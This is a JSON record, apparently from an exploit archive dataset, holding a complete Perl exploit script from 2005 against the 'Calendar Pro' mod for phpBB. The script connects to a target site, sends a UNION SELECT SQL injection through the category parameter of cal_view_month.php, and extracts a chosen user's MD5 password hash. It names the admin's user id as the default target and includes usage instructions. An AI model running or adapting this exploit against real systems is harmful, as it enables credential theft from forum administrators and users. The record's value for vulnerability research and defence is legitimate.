{
  "id": "910",
  "title": "phpBB 2.0.13 - &#039;Calendar Pro&#039; mod Get Hash",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\n##    Example:\r\n##    C:\\>cal_phpbb.pl www.site.com /phpBB2/ 2\r\n##\r\n##    'Calendar Pro' Mod for phpBB\r\n##    *************************\r\n##      [~] Connecting...\r\n##      [+] Connected!\r\n##      [~] Sending Data...\r\n##      [~] Data Sent, Waiting for response...\r\n##      [+] MD5 Hash for user with id=2 is: 81dc9bdb52d04dc20036dbd8313ed055\r\n##\r\nif (@ARGV < 3)\r\n{\r\nprint \"\\n\\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \" 'Calendar Pro' Mod <= 2.0.33 (Newest version) For phpBB\\n\";\r\nprint \" Bug found by Axl\\n\";\r\nprint \" Coded by CereBrums // 4/4/2005\\n\";\r\nprint \" Usage: cal_phpbb.pl <server> <folder> <user_id>\\n\";\r\nprint \" e.g.: cal_phpbb.pl www.site.com /phpBB2/ 2 \\n\";\r\nprint \" [~] <server> - site address\\n\";\r\nprint \" [~] <folder> - forum folder\\n\";\r\nprint \" [~] <user_id> - user id (2 is default for phpBB admin) \\n\";\r\nprint \"|****************************************************************|\\n\";\r\nprint \"\\n\\n\";\r\nexit(1);\r\n}\r\n\r\n$take = 0;\r\n$server = $ARGV[0];\r\n$folder = $ARGV[1];\r\n$user_id = $ARGV[2];\r\nprint \"\\n 'Calendar Pro' Mod for phpBB\\n\";\r\nprint \" *****************************\\n\";\r\nprint \"  [~] Connecting...\\n\";\r\n$socket = IO::Socket::INET->new(\r\nProto => \"tcp\",\r\nPeerAddr => \"$server\",\r\nPeerPort => \"80\") || die \"$socket error $!\";\r\n\r\nprint \"  [+] Connected!\\n\";\r\nprint \"  [~] Sending Data...\\n\";\r\n\r\n$path = \"http://$server/\";\r\n$path .= \"/$folder/\";\r\n$path .= \"cal_view_month.php?month=04&year=2005&category=-1%20UNION%20SELECT%20user_password%20FROM%20phpbb_users%20where%20user_id=$user_id/*\";\r\nprint $socket \"GET $path HTTP/1.0\\r\\n\\r\\n\";\r\n\r\nprint \"  [~] Data Sent, Waiting for response...\\n\";\r\n\r\nwhile ($answer = <$socket>)\r\n{\r\n       if ($take == 1) {\r\n               $in = rindex ($answer, \"(\");\r\n               if ( $in > -1 ) {\r\n                       $pass = substr($answer,$in+1,32);\r\n                       print \"  [+] MD5 Hash for user with id=$user_id is: $pass\\n\";\r\n                       exit();\r\n               }\r\n       }\r\n       if ( rindex ($answer,\"cal_view_month.php?month=3&year=2005\") > -1 ) {\r\n               $take = 1;\r\n       }\r\n}\r\nprint \"  [-] Exploit failed\\n\";\r\n\r\n#### EOF ####\r\n\r\n# milw0rm.com [2005-04-04]",
  "url": "https://www.exploit-db.com/exploits/910"
}